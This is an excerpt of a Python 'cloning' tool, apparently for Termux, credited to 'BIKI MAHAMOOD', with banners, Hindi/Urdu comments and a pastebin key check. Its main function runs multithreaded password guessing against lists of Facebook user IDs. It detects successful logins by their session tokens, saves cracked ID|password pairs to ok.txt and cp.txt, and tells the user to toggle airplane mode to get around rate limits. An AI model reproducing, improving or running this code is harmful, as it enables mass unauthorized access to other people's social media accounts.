...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m BIKI MAHAMOOD\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : BIKI MAHAMOOD \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/biki404-cyber \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./bikiterabap \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/biki404-cyber"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/bikiterabap")
...
def notice():
	...
	runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Aproval  ")
	os.system("xdg-open https://www.facebook.com/bikiterabap")
	runtxt("\033[0;97m Key Approval ke Liye Mujhe Request Bejiye >> %s%s"%(G,basesplit))
	os.system("xdg-open https://www.facebook.com/bikiterabap")
	subprocess.check_output(["am", "start", "https://www.facebook.com/bikiterabap"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://pastebin.com/edit/0dszVRHZ').text
			if basesplit in plr:
				key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCZL_Wjboqc4BOSSdHz7SjIQ"])
		print("───────────────────────────────────────────────────────× ")
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : HAR 10 MIN KE BAD AIRPLAN MOD/FLIGHT MOD ON KARNA ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=BIKI=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=BIKI=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=BIKI=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=BIKI=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #Wase copy krke apna name dal dyna
